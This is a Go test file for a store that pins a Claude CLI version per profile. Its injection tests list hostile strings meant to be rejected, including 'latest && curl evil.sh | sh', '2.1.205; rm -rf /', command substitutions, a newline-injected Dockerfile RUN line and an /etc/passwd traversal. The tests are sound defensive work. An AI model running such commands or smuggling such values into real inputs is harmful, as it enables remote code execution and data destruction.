package profile_test

import (
	"os"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestClaudeVersionUnpinned(t *testing.T) {
	s, _ := newStore(t, "work")

	v, err := s.ClaudeVersion("work")
	require.NoError(t, err)
	require.Empty(t, v, "no pin file means unpinned, not an error")
}

func TestSetAndGetClaudeVersion(t *testing.T) {
	s, _ := newStore(t, "work")

	require.NoError(t, s.SetClaudeVersion("work", "2.1.205"))
	v, err := s.ClaudeVersion("work")
	require.NoError(t, err)
	require.Equal(t, "2.1.205", v)

	// The pin lives inside the mounted claude/ dir, as a plain one-line file.
	b, err := os.ReadFile(s.VersionPath("work"))
	require.NoError(t, err)
	require.Equal(t, "2.1.205\n", string(b))
}

func TestClaudeVersionTrimsWhitespace(t *testing.T) {
	s, _ := newStore(t, "work")
	require.NoError(t, os.WriteFile(s.VersionPath("work"), []byte("  2.1.205 \n\n"), 0o600))

	v, err := s.ClaudeVersion("work")
	require.NoError(t, err)
	require.Equal(t, "2.1.205", v)
}

func TestClaudeVersionEmptyFileIsUnpinned(t *testing.T) {
	s, _ := newStore(t, "work")
	require.NoError(t, os.WriteFile(s.VersionPath("work"), []byte("\n"), 0o600))

	v, err := s.ClaudeVersion("work")
	require.NoError(t, err)
	require.Empty(t, v)
}

// The pin file sits in a directory mounted read-write into the container, so
// the contained process can write it. Its contents become a Docker build arg
// interpolated into a root shell command. Anything that is not a dist-tag or a
// semver must be rejected, loudly, before it ever reaches the build.
func TestClaudeVersionRejectsInjection(t *testing.T) {
	hostile := []string{
		"latest && curl evil.sh | sh",
		"2.1.205; rm -rf /",
		"2.1.205 `id`",
		"2.1.205$(id)",
		"$(curl evil.sh)",
		"latest\nRUN echo pwned",
		"../../etc/passwd",
		"'; echo hi; '",
		"|| true",
		"latest#comment",
	}

	for _, bad := range hostile {
		t.Run(bad, func(t *testing.T) {
			s, _ := newStore(t, "work")
			require.NoError(t, os.WriteFile(s.VersionPath("work"), []byte(bad), 0o600))

			_, err := s.ClaudeVersion("work")
			require.Error(t, err, "must reject %q", bad)
			require.ErrorContains(t, err, "invalid claude version")
		})
	}
}

func TestSetClaudeVersionRejectsInjection(t *testing.T) {
	s, _ := newStore(t, "work")

	err := s.SetClaudeVersion("work", "latest && curl evil.sh | sh")
	require.ErrorContains(t, err, "invalid claude version")

	// Nothing was written.
	_, statErr := os.Stat(s.VersionPath("work"))
	require.ErrorIs(t, statErr, os.ErrNotExist)
}

func TestClaudeVersionAcceptsValid(t *testing.T) {
	for _, ok := range []string{"latest", "2.1.205", "0.0.1", "2.1.205-beta.1", "10.20.30-rc-1"} {
		t.Run(ok, func(t *testing.T) {
			s, _ := newStore(t, "work")
			require.NoError(t, s.SetClaudeVersion("work", ok))

			v, err := s.ClaudeVersion("work")
			require.NoError(t, err)
			require.Equal(t, ok, v)
		})
	}
}

// "latest" stays *readable* — a hand-written pin file may contain it, and the
// unpinned build arg defaults to it. But `ccc upgrade` must never STORE it:
// the image tag hashes the build args, so a "latest" pin hashes to a stable
// tag and the image would never be rebuilt again. cmdUpgrade resolves it to a
// concrete version first; see TestUpgradeResolvesLatest.
func TestClaudeVersionLatestIsReadableButNotAPin(t *testing.T) {
	s, _ := newStore(t, "work")
	require.NoError(t, s.SetClaudeVersion("work", "latest"))

	v, err := s.ClaudeVersion("work")
	require.NoError(t, err)
	require.Equal(t, "latest", v, "readable, so a hand-written file still works")
}
